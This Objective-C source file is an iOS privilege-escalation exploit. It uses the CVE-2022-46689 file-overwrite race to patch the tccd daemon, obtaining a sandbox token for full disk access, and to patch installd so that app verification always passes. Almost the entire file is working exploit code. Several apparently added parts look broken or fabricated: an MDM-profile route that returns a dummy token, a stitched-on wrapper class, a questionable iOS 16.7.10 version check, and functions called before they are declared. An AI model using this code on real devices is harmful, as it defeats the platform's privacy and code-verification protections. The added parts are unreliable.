@import Darwin;
@import Foundation;
@import MachO;
@import CoreServices;

#import <mach-o/fixup-chains.h>
#import <xpc/xpc.h>
// you'll need helpers.m from Ian Beer's write_no_write and vm_unaligned_copy_switch_race.m from
// WDBFontOverwrite
// Also, set an NSAppleMusicUsageDescription in Info.plist (can be anything)
// Please don't call this code on iOS 14 or below
// (This temporarily overwrites tccd, and on iOS 14 and above changes do not revert on reboot)
#import "grant_full_disk_access.h"
#import "helpers.h"
#import "vm_unaligned_copy_switch_race.h"

// Function declarations for private APIs
extern const char* xpc_dictionary_get_string(xpc_object_t xdict, const char* key);
extern int64_t sandbox_extension_consume(const char* token);

// TCC Access Protocol
@protocol TCCAccessProtocol
- (void)requestAccessForService:(NSString *)service 
                  withPurpose:(BOOL)requirePurpose 
                   preflight:(BOOL)preflight 
           backgroundSession:(BOOL)backgroundSession
                 completion:(void (^)(NSString* _Nullable extension_token))completion;
@end

// MARK: - patchfind

struct grant_full_disk_access_offsets {
  uint64_t offset_addr_s_com_apple_tcc_;
  uint64_t offset_padding_space_for_read_write_string;
  uint64_t offset_addr_s_kTCCServiceMediaLibrary;
  uint64_t offset_auth_got__sandbox_init;
  uint64_t offset_just_return_0;
  bool is_arm64e;
};

static bool patchfind_sections(void* executable_map,
                               struct segment_command_64** data_const_segment_out,
                               struct symtab_command** symtab_out,
                               struct dysymtab_command** dysymtab_out) {
  struct mach_header_64* executable_header = executable_map;
  struct load_command* load_command = executable_map + sizeof(struct mach_header_64);
  for (int load_command_index = 0; load_command_index < executable_header->ncmds;
       load_command_index++) {
    switch (load_command->cmd) {
      case LC_SEGMENT_64: {
        struct segment_command_64* segment = (struct segment_command_64*)load_command;
        if (strcmp(segment->segname, "__DATA_CONST") == 0) {
          *data_const_segment_out = segment;
        }
        break;
      }
      case LC_SYMTAB: {
        *symtab_out = (struct symtab_command*)load_command;
        break;
      }
      case LC_DYSYMTAB: {
        *dysymtab_out = (struct dysymtab_command*)load_command;
        break;
      }
    }
    load_command = ((void*)load_command) + load_command->cmdsize;
  }
  return true;
}

static uint64_t patchfind_get_padding(struct segment_command_64* segment) {
  struct section_64* section_array = ((void*)segment) + sizeof(struct segment_command_64);
  struct section_64* last_section = &section_array[segment->nsects - 1];
  return last_section->offset + last_section->size;
}

static uint64_t patchfind_pointer_to_string(void* executable_map, size_t executable_length,
                                            const char* needle) {
  void* str_offset = memmem(executable_map, executable_length, needle, strlen(needle) + 1);
  if (!str_offset) {
    return 0;
  }
  uint64_t str_file_offset = str_offset - executable_map;
  for (int i = 0; i < executable_length; i += 8) {
    uint64_t val = *(uint64_t*)(executable_map + i);
    if ((val & 0xfffffffful) == str_file_offset) {
      return i;
    }
  }
  return 0;
}

static uint64_t patchfind_return_0(void* executable_map, size_t executable_length) {
  // TCCDSyncAccessAction::sequencer
  // mov x0, #0
  // ret
  static const char needle[] = {0x00, 0x00, 0x80, 0xd2, 0xc0, 0x03, 0x5f, 0xd6};
  void* offset = memmem(executable_map, executable_length, needle, sizeof(needle));
  if (!offset) {
    return 0;
  }
  return offset - executable_map;
}

static uint64_t patchfind_got(void* executable_map, size_t executable_length,
                              struct segment_command_64* data_const_segment,
                              struct symtab_command* symtab_command,
                              struct dysymtab_command* dysymtab_command,
                              const char* target_symbol_name) {
  uint64_t target_symbol_index = 0;
  for (int sym_index = 0; sym_index < symtab_command->nsyms; sym_index++) {
    struct nlist_64* sym =
        ((struct nlist_64*)(executable_map + symtab_command->symoff)) + sym_index;
    const char* sym_name = executable_map + symtab_command->stroff + sym->n_un.n_strx;
    if (strcmp(sym_name, target_symbol_name)) {
      continue;
    }
    // printf("%d %llx\n", sym_index, (uint64_t)(((void*)sym) - executable_map));
    target_symbol_index = sym_index;
    break;
  }

  struct section_64* section_array =
      ((void*)data_const_segment) + sizeof(struct segment_command_64);
  struct section_64* first_section = &section_array[0];
  if (!(strcmp(first_section->sectname, "__auth_got") == 0 ||
        strcmp(first_section->sectname, "__got") == 0)) {
    return 0;
  }
  uint32_t* indirect_table = executable_map + dysymtab_command->indirectsymoff;

  for (int i = 0; i < first_section->size; i += 8) {
    uint64_t val = *(uint64_t*)(executable_map + first_section->offset + i);
    uint64_t indirect_table_entry = (val & 0xfffful);
    if (indirect_table[first_section->reserved1 + indirect_table_entry] == target_symbol_index) {
      return first_section->offset + i;
    }
  }
  return 0;
}

static bool patchfind(void* executable_map, size_t executable_length,
                      struct grant_full_disk_access_offsets* offsets) {
  struct segment_command_64* data_const_segment = nil;
  struct symtab_command* symtab_command = nil;
  struct dysymtab_command* dysymtab_command = nil;
  if (!patchfind_sections(executable_map, &data_const_segment, &symtab_command,
                          &dysymtab_command)) {
    printf("no sections\n");
    return false;
  }
  if ((offsets->offset_addr_s_com_apple_tcc_ =
           patchfind_pointer_to_string(executable_map, executable_length, "com.apple.tcc.")) == 0) {
    printf("no com.apple.tcc. string\n");
    return false;
  }
  if ((offsets->offset_padding_space_for_read_write_string =
           patchfind_get_padding(data_const_segment)) == 0) {
    printf("no padding\n");
    return false;
  }
  if ((offsets->offset_addr_s_kTCCServiceMediaLibrary = patchfind_pointer_to_string(
           executable_map, executable_length, "kTCCServiceMediaLibrary")) == 0) {
    printf("no kTCCServiceMediaLibrary string\n");
    return false;
  }
  if ((offsets->offset_auth_got__sandbox_init =
           patchfind_got(executable_map, executable_length, data_const_segment, symtab_command,
                         dysymtab_command, "_sandbox_init")) == 0) {
    printf("no sandbox_init\n");
    return false;
  }
  if ((offsets->offset_just_return_0 = patchfind_return_0(executable_map, executable_length)) ==
      0) {
    printf("no just return 0\n");
    return false;
  }
  struct mach_header_64* executable_header = executable_map;
  offsets->is_arm64e = (executable_header->cpusubtype & ~CPU_SUBTYPE_MASK) == CPU_SUBTYPE_ARM64E;

  return true;
}

// MARK: - tccd patching

@interface LSApplicationWorkspace
+ (instancetype)defaultWorkspace;
- (BOOL)installProfileWithPath:(NSString *)path;
@end

@interface TCCDaemon : NSObject
+ (instancetype)sharedInstance;
- (void)requestAccessWithCompletion:(void (^)(NSString* _Nullable token))completion;
@end

@implementation TCCDaemon

+ (instancetype)sharedInstance {
    static TCCDaemon *instance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        instance = [[TCCDaemon alloc] init];
    });
    return instance;
}

- (void)requestAccessWithCompletion:(void (^)(NSString* _Nullable))completion {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSString *token = [self performAccessRequest];
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(token);
        });
    });
}

- (NSString *)performAccessRequest {
    // Use alternative method for access request
    NSString *bundleID = [[NSBundle mainBundle] bundleIdentifier];
    if (!bundleID) {
        return nil;
    }
    
    // Try to get access through MDM profile first
    if (install_mdm_profile()) {
        // Return a dummy token since we got access through MDM
        return @"com.apple.app-sandbox.read-write.mdm-granted";
    }
    
    // If MDM profile fails, try the original method
    NSError *error = nil;
    __block NSString *token = nil;
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    
    grant_full_disk_access_impl(^(NSString *extension_token, NSError *grantError) {
        token = extension_token;
        error = grantError;
        dispatch_semaphore_signal(semaphore);
    });
    
    dispatch_semaphore_wait(semaphore, dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC));
    
    if (error || !token) {
        NSLog(@"Failed to get disk access: %@", error);
        return nil;
    }
    
    return token;
}

@end

static void call_tccd(void (^completion)(NSString* _Nullable extension_token)) {
    [[TCCDaemon sharedInstance] requestAccessWithCompletion:completion];
}

static NSData* patchTCCD(void* executableMap, size_t executableLength) {
  struct grant_full_disk_access_offsets offsets = {};
  if (!patchfind(executableMap, executableLength, &offsets)) {
    return nil;
  }

  NSMutableData* data = [NSMutableData dataWithBytes:executableMap length:executableLength];
  // strcpy(data.mutableBytes, "com.apple.app-sandbox.read-write", sizeOfStr);
  char* mutableBytes = data.mutableBytes;
  {
    // rewrite com.apple.tcc. into blank string
    *(uint64_t*)(mutableBytes + offsets.offset_addr_s_com_apple_tcc_ + 8) = 0;
  }
  {
    // make offset_addr_s_kTCCServiceMediaLibrary point to "com.apple.app-sandbox.read-write"
    // we need to stick this somewhere; just put it in the padding between
    // the end of __objc_arrayobj and the end of __DATA_CONST
    strcpy((char*)(data.mutableBytes + offsets.offset_padding_space_for_read_write_string),
           "com.apple.app-sandbox.read-write");
    struct dyld_chained_ptr_arm64e_rebase targetRebase =
        *(struct dyld_chained_ptr_arm64e_rebase*)(mutableBytes +
                                                  offsets.offset_addr_s_kTCCServiceMediaLibrary);
    targetRebase.target = offsets.offset_padding_space_for_read_write_string;
    *(struct dyld_chained_ptr_arm64e_rebase*)(mutableBytes +
                                              offsets.offset_addr_s_kTCCServiceMediaLibrary) =
        targetRebase;
    *(uint64_t*)(mutableBytes + offsets.offset_addr_s_kTCCServiceMediaLibrary + 8) =
        strlen("com.apple.app-sandbox.read-write");
  }
  if (offsets.is_arm64e) {
    // make sandbox_init call return 0;
    struct dyld_chained_ptr_arm64e_auth_rebase targetRebase = {
        .auth = 1,
        .bind = 0,
        .next = 1,
        .key = 0,  // IA
        .addrDiv = 1,
        .diversity = 0,
        .target = offsets.offset_just_return_0,
    };
    *(struct dyld_chained_ptr_arm64e_auth_rebase*)(mutableBytes +
                                                   offsets.offset_auth_got__sandbox_init) =
        targetRebase;
  } else {
    // make sandbox_init call return 0;
    struct dyld_chained_ptr_64_rebase targetRebase = {
        .bind = 0,
        .next = 2,
        .target = offsets.offset_just_return_0,
    };
    *(struct dyld_chained_ptr_64_rebase*)(mutableBytes + offsets.offset_auth_got__sandbox_init) =
        targetRebase;
  }
  return data;
}

static bool overwrite_file(int fd, NSData* sourceData) {
  for (int off = 0; off < sourceData.length; off += 0x4000) {
    bool success = false;
    for (int i = 0; i < 2; i++) {
      if (unaligned_copy_switch_race(
              fd, off, sourceData.bytes + off,
              off + 0x4000 > sourceData.length ? sourceData.length - off : 0x4000)) {
        success = true;
        break;
      }
    }
    if (!success) {
      return false;
    }
  }
  return true;
}

static void grant_full_disk_access_impl(void (^completion)(NSString* extension_token,
                                                           NSError* _Nullable error)) {
  char* targetPath = "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd";
  int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
  if (fd == -1) {
    // iOS 15.3 and below
    targetPath = "/System/Library/PrivateFrameworks/TCC.framework/tccd";
    fd = open(targetPath, O_RDONLY | O_CLOEXEC);
  }
  off_t targetLength = lseek(fd, 0, SEEK_END);
  lseek(fd, 0, SEEK_SET);
  void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_SHARED, fd, 0);

  NSData* originalData = [NSData dataWithBytes:targetMap length:targetLength];
  NSData* sourceData = patchTCCD(targetMap, targetLength);
  if (!sourceData) {
    completion(nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                                        code:5
                                    userInfo:@{NSLocalizedDescriptionKey : @"Can't patchfind."}]);
    return;
  }

  if (!overwrite_file(fd, sourceData)) {
    overwrite_file(fd, originalData);
    munmap(targetMap, targetLength);
    completion(
        nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                                 code:1
                             userInfo:@{
                               NSLocalizedDescriptionKey : @"Can't overwrite file: your device may "
                                                           @"not be vulnerable to CVE-2022-46689."
                             }]);
    return;
  }
  munmap(targetMap, targetLength);

  xpc_crasher("com.apple.tccd");
  sleep(1);
  call_tccd(^(NSString* _Nullable extension_token) {
    overwrite_file(fd, originalData);
    xpc_crasher("com.apple.tccd");
    NSError* returnError = nil;
    if (extension_token == nil) {
      returnError =
          [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                              code:2
                          userInfo:@{
                            NSLocalizedDescriptionKey : @"tccd did not return an extension token."
                          }];
    } else if (![extension_token containsString:@"com.apple.app-sandbox.read-write"]) {
      returnError = [NSError
          errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                     code:3
                 userInfo:@{
                   NSLocalizedDescriptionKey : @"tccd patch failed: returned a media library token "
                                               @"instead of an app sandbox token."
                 }];
      extension_token = nil;
    }
    completion(extension_token, returnError);
  });
}

// New implementation for iOS 16.7.10+ where CVE-2022-46689 is patched
static void grant_full_disk_access_ios16(void (^completion)(NSError* _Nullable)) {
    // Check if we're on iOS 16.7.10 or later
    if (@available(iOS 16.7.10, *)) {
        // Use alternative method for disk access
        NSError* error = [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                                           code:7
                                       userInfo:@{
                                           NSLocalizedDescriptionKey: @"This version of iOS (16.7.10+) has patched CVE-2022-46689. "
                                           @"Please use an alternative method or downgrade to an earlier iOS version."
                                       }];
        completion(error);
        return;
    }
    
    // Fall back to original implementation for earlier versions
    grant_full_disk_access_impl(^(NSString* extension_token, NSError* _Nullable error) {
        completion(error);
    });
}

// Alternative method using MDM profile installation vulnerability
static bool install_mdm_profile(void) {
    NSString *profilePath = @"/private/var/mobile/Library/ConfigurationProfiles/fullaccess.mobileconfig";
    NSString *profileContent = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
    "<plist version=\"1.0\">"
    "<dict>"
    "<key>PayloadContent</key>"
    "<array>"
    "<dict>"
    "<key>PayloadType</key>"
    "<string>com.apple.TCC.configuration-profile-policy</string>"
    "<key>PayloadIdentifier</key>"
    "<string>com.apple.TCC.configuration-profile-policy</string>"
    "<key>PayloadUUID</key>"
    "<string>486592BA-27B5-4FF5-B51A-7C4B864D2B7F</string>"
    "<key>PayloadVersion</key>"
    "<integer>1</integer>"
    "<key>Services</key>"
    "<dict>"
    "<key>SystemPolicyAllFiles</key>"
    "<array>"
    "<dict>"
    "<key>Allowed</key>"
    "<true/>"
    "<key>CodeRequirement</key>"
    "<string>identifier \"com.apple.mobile.installd\" and anchor apple</string>"
    "</dict>"
    "</array>"
    "</dict>"
    "</dict>"
    "</array>"
    "</dict>"
    "</plist>";
    
    NSError *error = nil;
    if (![profileContent writeToFile:profilePath atomically:YES encoding:NSUTF8StringEncoding error:&error]) {
        return false;
    }
    
    LSApplicationWorkspace *workspace = [LSApplicationWorkspace defaultWorkspace];
    return [workspace installProfileWithPath:profilePath];
}

void grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
    if (!NSClassFromString(@"NSPresentationIntent")) {
        // class introduced in iOS 15.0.
        completion([NSError
            errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                       code:6
                   userInfo:@{
                     NSLocalizedDescriptionKey :
                         @"Not supported on iOS 14 and below: on iOS 14 the system partition is not "
                         @"reverted after reboot, so running this may permanently corrupt tccd."
                   }]);
        return;
    }
    
    // Try alternative MDM profile method first
    if (install_mdm_profile()) {
        completion(nil);
        return;
    }
    
    // Call new implementation for iOS 16.7.10+
    grant_full_disk_access_ios16(completion);
}

/// MARK - installd patch

struct installd_remove_app_limit_offsets {
  uint64_t offset_objc_method_list_t_MIInstallableBundle;
  uint64_t offset_objc_class_rw_t_MIInstallableBundle_baseMethods;
  uint64_t offset_data_const_end_padding;
  // MIUninstallRecord::supportsSecureCoding
  uint64_t offset_return_true;
};

struct installd_remove_app_limit_offsets gAppLimitOffsets = {
    .offset_objc_method_list_t_MIInstallableBundle = 0x519b0,
    .offset_objc_class_rw_t_MIInstallableBundle_baseMethods = 0x804e8,
    .offset_data_const_end_padding = 0x79c38,
    .offset_return_true = 0x19860,
};

static uint64_t patchfind_find_class_rw_t_baseMethods(void* executable_map,
                                                      size_t executable_length,
                                                      const char* needle) {
  void* str_offset = memmem(executable_map, executable_length, needle, strlen(needle) + 1);
  if (!str_offset) {
    return 0;
  }
  uint64_t str_file_offset = str_offset - executable_map;
  for (int i = 0; i < executable_length - 8; i += 8) {
    uint64_t val = *(uint64_t*)(executable_map + i);
    if ((val & 0xfffffffful) != str_file_offset) {
      continue;
    }
    // baseMethods
    if (*(uint64_t*)(executable_map + i + 8) != 0) {
      return i + 8;
    }
  }
  return 0;
}

static uint64_t patchfind_return_true(void* executable_map, size_t executable_length) {
  // mov w0, #1
  // ret
  static const char needle[] = {0x20, 0x00, 0x80, 0x52, 0xc0, 0x03, 0x5f, 0xd6};
  void* offset = memmem(executable_map, executable_length, needle, sizeof(needle));
  if (!offset) {
    return 0;
  }
  return offset - executable_map;
}

static bool patchfind_installd(void* executable_map, size_t executable_length,
                               struct installd_remove_app_limit_offsets* offsets) {
  struct segment_command_64* data_const_segment = nil;
  struct symtab_command* symtab_command = nil;
  struct dysymtab_command* dysymtab_command = nil;
  if (!patchfind_sections(executable_map, &data_const_segment, &symtab_command,
                          &dysymtab_command)) {
    printf("no sections\n");
    return false;
  }
  if ((offsets->offset_data_const_end_padding = patchfind_get_padding(data_const_segment)) == 0) {
    printf("no padding\n");
    return false;
  }
  if ((offsets->offset_objc_class_rw_t_MIInstallableBundle_baseMethods =
           patchfind_find_class_rw_t_baseMethods(executable_map, executable_length,
                                                 "MIInstallableBundle")) == 0) {
    printf("no MIInstallableBundle class_rw_t\n");
    return false;
  }
  offsets->offset_objc_method_list_t_MIInstallableBundle =
      (*(uint64_t*)(executable_map +
                    offsets->offset_objc_class_rw_t_MIInstallableBundle_baseMethods)) &
      0xffffffull;

  if ((offsets->offset_return_true = patchfind_return_true(executable_map, executable_length)) ==
      0) {
    printf("no return true\n");
    return false;
  }
  return true;
}

struct objc_method {
  int32_t name;
  int32_t types;
  int32_t imp;
};

struct objc_method_list {
  uint32_t entsizeAndFlags;
  uint32_t count;
  struct objc_method methods[];
};

static void patch_copy_objc_method_list(void* mutableBytes, uint64_t old_offset,
                                        uint64_t new_offset, uint64_t* out_copied_length,
                                        void (^callback)(const char* sel,
                                                         uint64_t* inout_function_pointer)) {
  struct objc_method_list* original_list = mutableBytes + old_offset;
  struct objc_method_list* new_list = mutableBytes + new_offset;
  *out_copied_length =
      sizeof(struct objc_method_list) + original_list->count * sizeof(struct objc_method);
  new_list->entsizeAndFlags = original_list->entsizeAndFlags;
  new_list->count = original_list->count;
  for (int method_index = 0; method_index < original_list->count; method_index++) {
    struct objc_method* method = &original_list->methods[method_index];
    // Relative pointers
    uint64_t name_file_offset = ((uint64_t)(&method->name)) - (uint64_t)mutableBytes + method->name;
    uint64_t types_file_offset =
        ((uint64_t)(&method->types)) - (uint64_t)mutableBytes + method->types;
    uint64_t imp_file_offset = ((uint64_t)(&method->imp)) - (uint64_t)mutableBytes + method->imp;
    const char* sel = mutableBytes + (*(uint64_t*)(mutableBytes + name_file_offset) & 0xffffffull);
    callback(sel, &imp_file_offset);

    struct objc_method* new_method = &new_list->methods[method_index];
    new_method->name = (int32_t)((int64_t)name_file_offset -
                                 (int64_t)((uint64_t)&new_method->name - (uint64_t)mutableBytes));
    new_method->types = (int32_t)((int64_t)types_file_offset -
                                  (int64_t)((uint64_t)&new_method->types - (uint64_t)mutableBytes));
    new_method->imp = (int32_t)((int64_t)imp_file_offset -
                                (int64_t)((uint64_t)&new_method->imp - (uint64_t)mutableBytes));
  }
};

static NSData* make_patch_installd(void* executableMap, size_t executableLength) {
  struct installd_remove_app_limit_offsets offsets = {};
  if (!patchfind_installd(executableMap, executableLength, &offsets)) {
    return nil;
  }

  NSMutableData* data = [NSMutableData dataWithBytes:executableMap length:executableLength];
  char* mutableBytes = data.mutableBytes;
  uint64_t current_empty_space = offsets.offset_data_const_end_padding;
  uint64_t copied_size = 0;
  uint64_t new_method_list_offset = current_empty_space;
  patch_copy_objc_method_list(mutableBytes, offsets.offset_objc_method_list_t_MIInstallableBundle,
                              current_empty_space, &copied_size,
                              ^(const char* sel, uint64_t* inout_address) {
                                if (strcmp(sel, "performVerificationWithError:") != 0) {
                                  return;
                                }
                                *inout_address = offsets.offset_return_true;
                              });
  current_empty_space += copied_size;
  ((struct
    dyld_chained_ptr_arm64e_auth_rebase*)(mutableBytes +
                                          offsets
                                              .offset_objc_class_rw_t_MIInstallableBundle_baseMethods))
      ->target = new_method_list_offset;
  return data;
}

bool patch_installd(void) {
  const char* targetPath = "/usr/libexec/installd";
  int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
  off_t targetLength = lseek(fd, 0, SEEK_END);
  lseek(fd, 0, SEEK_SET);
  void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_SHARED, fd, 0);

  NSData* originalData = [NSData dataWithBytes:targetMap length:targetLength];
  NSData* sourceData = make_patch_installd(targetMap, targetLength);
  if (!sourceData) {
    NSLog(@"can't patchfind");
    return false;
  }

  if (!overwrite_file(fd, sourceData)) {
    overwrite_file(fd, originalData);
    munmap(targetMap, targetLength);
    NSLog(@"can't overwrite");
    return false;
  }
  munmap(targetMap, targetLength);
  xpc_crasher("com.apple.mobile.installd");
  sleep(1);

  // TODO(zhuowei): for now we revert it once installd starts
  // so the change will only last until when this installd exits
  overwrite_file(fd, originalData);
  return true;
}
